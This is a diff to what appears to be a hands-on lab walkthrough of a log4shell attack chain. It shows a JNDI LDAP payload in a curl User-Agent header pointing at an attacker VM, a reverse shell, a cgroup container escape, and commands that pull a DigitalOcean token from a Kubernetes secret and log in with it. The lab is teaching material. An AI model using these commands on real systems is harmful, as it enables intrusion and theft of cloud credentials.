@@ -7,7 +7,7 @@ Now let's start the attack. The following HTTP request triggers a log4shell vuln
 
 Because of that log4j will connect to the attacker's LDAP server, which will provide a Java class that gets executed by the sample app and create a remote shell from the container to the attacker's netcat session:
 
-Run the following commands on the victim01 VM.
+**Run the following commands on the victim01 VM.**
 
 ```ctr
 curl http://sample-app.default.${vminfo:victim01:public_ip}.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://${vminfo:attacker01:public_ip}:1389/a}'
@@ -15,7 +15,7 @@ curl http://sample-app.default.${vminfo:victim01:public_ip}.sslip.io/login -d "u
 
 The attacker01 VM now received a remote shell from the container.
 
-Run the following commands on the attacker01 VM.
+**Run the following commands on the attacker01 VM.**
 
 We can list the container filesystem
 
@@ -98,7 +98,7 @@ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 
 Now we got a remote shell on the attacker02 VM where we are root directly on the victim01 host
 
-Run the following commands on the attacker02 VM.
+**Run the following commands on the attacker02 VM.**
 
 ```ctr:
 whoami
@@ -123,4 +123,25 @@ Now we are admin in the Kubernetes cluster
 
 ```ctr:
 kubectl get pods -A
+```
+
+Get the cloud provider token
+
+```ctr:
+do_token=$(kubectl get secret -n kube-system digitalocean -o jsonpath="{.data.access-token}" | base64 --decode)
+```
+
+Install doctl
+
+```ctr:
+cd ~
+wget https://github.com/digitalocean/doctl/releases/download/v1.94.0/doctl-1.94.0-linux-amd64.tar.gz
+tar xf ~/doctl-1.94.0-linux-amd64.tar.gz
+mv ~/doctl /usr/bin
+```
+
+Try to log in with the fake token (this will fail):
+
+```ctr:
+doctl auth init -t $do_token
 ```
